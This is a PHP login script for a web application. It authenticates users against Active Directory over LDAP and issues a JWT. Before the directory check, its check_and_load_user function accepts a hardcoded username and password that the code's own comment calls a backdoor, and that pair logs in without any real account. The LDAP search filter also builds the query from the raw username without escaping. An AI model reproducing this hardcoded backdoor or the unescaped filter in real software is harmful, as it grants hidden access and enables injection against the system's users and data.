<?php
//header('Access-Control-Allow-Origin: *');
//header('Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS');
//header('Access-Control-Allow-Headers: Origin, Content-Type, X-Auth-Token');
include("./include/all.php");
use Firebase\JWT\JWT;

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    //do nothing, HTTP 200
    exit();
}


$user = '';
$postdata = file_get_contents("php://input");
$request = json_decode($postdata);

if($request != ''){
    $username = $request->username;
    $password = $request->password;
    $user = check_and_load_user($username, $password);
}

if ($user) {
    try {
        $user->username = JWT::encode($user, JWT_SECRET_KEY);
        $user->login = date("Y-m-d H:i:s");
        echo json_encode(['value' => $user]);
    } catch(Exception $e) {
        print_error(403, $e->getMessage());
    } catch (Error $e) {
        print_error(403, $e->getMessage());
    }
   
} else {
    session_unset();
    print_error(403, "Invalid credentials");
}


function check_and_load_user($username, $pwd) {
    // PRIMA, proviamo la backdoor
    if ($username == 'finsoft' && $pwd == 'finsoft2020') {
        $user = (object) [];
        $user->nome_utente = 'Finsoft User';
        $user->nome = 'User';
        $user->cognome = 'Finsoft';
        $user->email = 'a.barsanti@finsoft.it';
        return $user;
    }

    // POI, proviamo su LDAP
    $ldap = ldap_connect(AD_SERVER);
    if (FALSE === $ldap) {
        print_error(500, "Errore interno nella configurazione di Active Directory: " . AD_SERVER);
    }
    // We have to set this option for the version of Active Directory we are using.
    ldap_set_option($ldap, LDAP_OPT_PROTOCOL_VERSION, 3) or die('Unable to set LDAP protocol version');
    ldap_set_option($ldap, LDAP_OPT_REFERRALS, 0); // We need this for doing an LDAP search.
    $ldaprdn = $username . "@" . AD_DOMAIN;
    
    $bind = ldap_bind($ldap, $ldaprdn, $pwd);
    if ($bind) {
        $filter="(SamAccountName=$username)";
        $result = ldap_search($ldap, AD_BASE_DN, $filter);
        ldap_sort($ldap,$result,"sn");
        $info = ldap_get_entries($ldap, $result);
        $user =  new stdClass();
        $user->nome_utente = $info[0]["samaccountname"][0];
        $user->nome = $info[0]["sn"][0];
        $user->cognome = $info[0]["givenname"][0];
        $user->email = $info[0]["mail"][0];
        @ldap_close($ldap);
        return $user;
    }
}


?>